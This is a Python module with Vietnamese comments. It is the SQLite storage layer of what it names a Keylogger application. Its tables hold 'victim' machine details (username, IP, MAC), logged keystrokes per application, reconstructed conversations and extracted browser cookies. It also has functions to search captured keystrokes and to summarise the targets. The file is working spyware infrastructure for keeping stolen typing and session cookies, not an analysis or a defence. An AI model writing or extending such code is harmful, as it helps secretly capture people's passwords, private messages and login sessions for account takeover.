#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Module quản lý cơ sở dữ liệu cho ứng dụng Keylogger
"""

import os
import sqlite3
import logging
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple, Union

class Database:
    """Quản lý cơ sở dữ liệu SQLite cho ứng dụng Keylogger."""
    
    def __init__(self, db_path: str):
        """Khởi tạo Database với đường dẫn file DB.
        
        Args:
            db_path: Đường dẫn đến file cơ sở dữ liệu SQLite
        """
        self.db_path = db_path
        self.logger = logging.getLogger("keylogger.database")
        self._create_tables()
    
    def _get_connection(self) -> sqlite3.Connection:
        """Tạo và trả về kết nối đến DB."""
        os.makedirs(os.path.dirname(os.path.abspath(self.db_path)), exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row  # Để kết quả truy vấn có thể truy cập qua tên cột
        return conn
    
    def _create_tables(self) -> None:
        """Tạo các bảng cần thiết nếu chưa tồn tại."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                # Bảng lưu thông tin máy tính nạn nhân
                cursor.execute("""
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_name TEXT,
                    username TEXT,
                    ip_address TEXT,
                    mac_address TEXT,
                    os_info TEXT,
                    first_seen TEXT,
                    last_seen TEXT
                )
                """)
                
                # Bảng lưu log bàn phím
                cursor.execute("""
                CREATE TABLE IF NOT EXISTS keystrokes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id INTEGER,
                    timestamp TEXT,
                    keypress TEXT,
                    application TEXT,
                    FOREIGN KEY (target_id) REFERENCES targets (id)
                )
                """)
                
                # Bảng lưu các đoạn hội thoại đã xử lý
                cursor.execute("""
                CREATE TABLE IF NOT EXISTS conversations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id INTEGER,
                    timestamp TEXT,
                    application TEXT,
                    content TEXT,
                    FOREIGN KEY (target_id) REFERENCES targets (id)
                )
                """)
                
                # Bảng lưu thông tin cookie đã trích xuất
                cursor.execute("""
                CREATE TABLE IF NOT EXISTS cookies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id INTEGER,
                    browser TEXT,
                    profile TEXT,
                    domain TEXT,
                    name TEXT,
                    value TEXT,
                    path TEXT,
                    expires TEXT,
                    secure INTEGER,
                    httponly INTEGER,
                    timestamp TEXT,
                    FOREIGN KEY (target_id) REFERENCES targets (id)
                )
                """)
                
                self.logger.info("Đã khởi tạo cơ sở dữ liệu")
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi tạo bảng DB: {e}")
            raise
    
    def add_target(self, device_info: Dict[str, str]) -> int:
        """Thêm hoặc cập nhật thông tin target và trả về target_id."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                # Kiểm tra xem target đã tồn tại chưa (dựa trên mac_address)
                cursor.execute(
                    "SELECT id FROM targets WHERE mac_address = ?",
                    (device_info["mac_address"],),
                )
                result = cursor.fetchone()
                
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                if result:
                    target_id = result["id"]
                    # Cập nhật thông tin nếu đã tồn tại
                    cursor.execute("""
                    UPDATE targets 
                    SET device_name = ?, username = ?, ip_address = ?, 
                        os_info = ?, last_seen = ?
                    WHERE id = ?
                    """,
                    (
                        device_info["device_name"],
                        device_info["username"],
                        device_info["ip_address"],
                        device_info["os_info"],
                        now,
                        target_id,
                    ))
                else:
                    # Thêm mới nếu chưa tồn tại
                    cursor.execute("""
                    INSERT INTO targets 
                    (device_name, username, ip_address, mac_address, os_info, first_seen, last_seen)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                    """,
                    (
                        device_info["device_name"],
                        device_info["username"],
                        device_info["ip_address"],
                        device_info["mac_address"],
                        device_info["os_info"],
                        now,
                        now,
                    ))
                    target_id = cursor.lastrowid
                
                self.logger.info(f"Đã thêm/cập nhật target ID {target_id}")
                return target_id
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi thêm/cập nhật target: {e}")
            raise
    
    def add_keystroke(self, target_id: int, timestamp: str, keypress: str, application: str = "") -> int:
        """Thêm một bản ghi keystroke vào DB và trả về ID của bản ghi."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                INSERT INTO keystrokes (target_id, timestamp, keypress, application)
                VALUES (?, ?, ?, ?)
                """,
                (target_id, timestamp, keypress, application))
                
                return cursor.lastrowid
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi thêm keystroke: {e}")
            return -1
    
    def add_keystrokes_batch(self, keystrokes: List[Tuple[int, str, str, str]]) -> bool:
        """Thêm nhiều bản ghi keystroke cùng lúc (target_id, timestamp, keypress, application)."""
        if not keystrokes:
            return True
        
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.executemany("""
                INSERT INTO keystrokes (target_id, timestamp, keypress, application)
                VALUES (?, ?, ?, ?)
                """, keystrokes)
                
                self.logger.debug(f"Đã thêm {len(keystrokes)} keystroke vào DB")
                return True
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi thêm keystroke batch: {e}")
            return False
    
    def add_conversation(self, target_id: int, timestamp: str, application: str, content: str) -> int:
        """Thêm một đoạn hội thoại đã xử lý vào DB."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("""
                INSERT INTO conversations (target_id, timestamp, application, content)
                VALUES (?, ?, ?, ?)
                """,
                (target_id, timestamp, application, content))
                
                return cursor.lastrowid
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi thêm conversation: {e}")
            return -1
    
    def add_conversations_batch(self, conversations: List[Tuple[int, str, str, str]]) -> bool:
        """Thêm nhiều đoạn hội thoại cùng lúc (target_id, timestamp, application, content)."""
        if not conversations:
            return True
        
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                cursor.executemany("""
                INSERT INTO conversations (target_id, timestamp, application, content)
                VALUES (?, ?, ?, ?)
                """, conversations)
                
                return True
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi thêm conversations batch: {e}")
            return False
    
    def get_all_targets(self) -> List[Dict[str, Any]]:
        """Lấy danh sách tất cả targets từ DB."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("SELECT * FROM targets ORDER BY last_seen DESC")
                targets = [dict(row) for row in cursor.fetchall()]
                
                return targets
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi lấy danh sách targets: {e}")
            return []
    
    def get_keystrokes_for_target(self, target_id: int, limit: int = 1000) -> List[Dict[str, Any]]:
        """Lấy danh sách keystroke của một target cụ thể."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                SELECT * FROM keystrokes 
                WHERE target_id = ? 
                ORDER BY timestamp DESC 
                LIMIT ?
                """, (target_id, limit))
                
                keystrokes = [dict(row) for row in cursor.fetchall()]
                
                return keystrokes
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi lấy keystrokes của target {target_id}: {e}")
            return []
    
    def get_conversations_for_target(self, target_id: int, limit: int = 100) -> List[Dict[str, Any]]:
        """Lấy danh sách đoạn hội thoại của một target cụ thể."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("""
                SELECT * FROM conversations 
                WHERE target_id = ? 
                ORDER BY timestamp DESC 
                LIMIT ?
                """, (target_id, limit))
                
                conversations = [dict(row) for row in cursor.fetchall()]
                
                return conversations
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi lấy conversations của target {target_id}: {e}")
            return []
    
    def get_target_by_id(self, target_id: int) -> Optional[Dict[str, Any]]:
        """Lấy thông tin của một target theo ID."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("SELECT * FROM targets WHERE id = ?", (target_id,))
                target = cursor.fetchone()
                
                return dict(target) if target else None
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi lấy thông tin target {target_id}: {e}")
            return None
    
    def delete_target(self, target_id: int) -> bool:
        """Xóa target và tất cả dữ liệu liên quan."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                # Xóa tất cả keystroke, conversation và cookie của target
                cursor.execute("DELETE FROM keystrokes WHERE target_id = ?", (target_id,))
                cursor.execute("DELETE FROM conversations WHERE target_id = ?", (target_id,))
                cursor.execute("DELETE FROM cookies WHERE target_id = ?", (target_id,))
                
                # Xóa target
                cursor.execute("DELETE FROM targets WHERE id = ?", (target_id,))
                
                self.logger.info(f"Đã xóa target {target_id} và dữ liệu liên quan")
                return True
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi xóa target {target_id}: {e}")
            return False
    
    def add_cookies_batch(self, target_id: int, cookies: List[Dict[str, Any]]) -> bool:
        """Thêm nhiều cookie cùng lúc."""
        if not cookies:
            return True
        
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                for cookie in cookies:
                    secure = 1 if cookie.get("secure", False) else 0
                    httponly = 1 if cookie.get("httponly", False) else 0
                    
                    cursor.execute("""
                    INSERT INTO cookies 
                    (target_id, browser, profile, domain, name, value, path, expires, secure, httponly, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    (
                        target_id,
                        cookie.get("browser", ""),
                        cookie.get("profile", ""),
                        cookie.get("domain", ""),
                        cookie.get("name", ""),
                        cookie.get("value", ""),
                        cookie.get("path", ""),
                        cookie.get("expires", ""),
                        secure,
                        httponly,
                        timestamp
                    ))
                
                self.logger.info(f"Đã thêm {len(cookies)} cookie cho target {target_id}")
                return True
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi thêm cookies batch: {e}")
            return False
    
    def get_cookies_for_target(self, target_id: int) -> List[Dict[str, Any]]:
        """Lấy danh sách cookie của một target cụ thể."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                cursor.execute("SELECT * FROM cookies WHERE target_id = ?", (target_id,))
                cookies = [dict(row) for row in cursor.fetchall()]
                
                return cookies
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi lấy cookies của target {target_id}: {e}")
            return []
    
    def search_keystrokes(self, target_id: int, search_text: str, case_sensitive: bool = False, app_filter: str = None) -> List[Dict[str, Any]]:
        """Tìm kiếm keystroke theo từ khóa và bộ lọc."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                query = "SELECT * FROM keystrokes WHERE target_id = ?"
                params = [target_id]
                
                if search_text:
                    if case_sensitive:
                        query += " AND keypress LIKE ?"
                    else:
                        query += " AND LOWER(keypress) LIKE LOWER(?)"
                    params.append(f"%{search_text}%")
                
                if app_filter and app_filter != "Tất cả":
                    query += " AND application = ?"
                    params.append(app_filter)
                
                query += " ORDER BY timestamp DESC LIMIT 1000"
                
                cursor.execute(query, params)
                keystrokes = [dict(row) for row in cursor.fetchall()]
                
                return keystrokes
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi tìm kiếm keystrokes: {e}")
            return []
    
    def get_statistics(self) -> Dict[str, Any]:
        """Lấy thống kê tổng quan về dữ liệu trong DB."""
        try:
            with self._get_connection() as conn:
                cursor = conn.cursor()
                
                # Số lượng target
                cursor.execute("SELECT COUNT(*) as count FROM targets")
                target_count = cursor.fetchone()["count"]
                
                # Số lượng keystroke
                cursor.execute("SELECT COUNT(*) as count FROM keystrokes")
                keystroke_count = cursor.fetchone()["count"]
                
                # Số lượng conversation
                cursor.execute("SELECT COUNT(*) as count FROM conversations")
                conversation_count = cursor.fetchone()["count"]
                
                # Số lượng cookie
                cursor.execute("SELECT COUNT(*) as count FROM cookies")
                cookie_count = cursor.fetchone()["count"]
                
                # Target hoạt động mới nhất
                cursor.execute("SELECT id, device_name, last_seen FROM targets ORDER BY last_seen DESC LIMIT 5")
                recent_targets = [dict(row) for row in cursor.fetchall()]
                
                # Ứng dụng phổ biến nhất
                cursor.execute("""
                SELECT application, COUNT(*) as count 
                FROM keystrokes 
                WHERE application != '' 
                GROUP BY application 
                ORDER BY count DESC LIMIT 5
                """)
                top_apps = [dict(row) for row in cursor.fetchall()]
                
                return {
                    "target_count": target_count,
                    "keystroke_count": keystroke_count,
                    "conversation_count": conversation_count,
                    "cookie_count": cookie_count,
                    "recent_targets": recent_targets,
                    "top_apps": top_apps
                }
        except sqlite3.Error as e:
            self.logger.error(f"Lỗi khi lấy thống kê DB: {e}")
            return {
                "target_count": 0,
                "keystroke_count": 0,
                "conversation_count": 0,
                "cookie_count": 0,
                "recent_targets": [],
                "top_apps": []
            }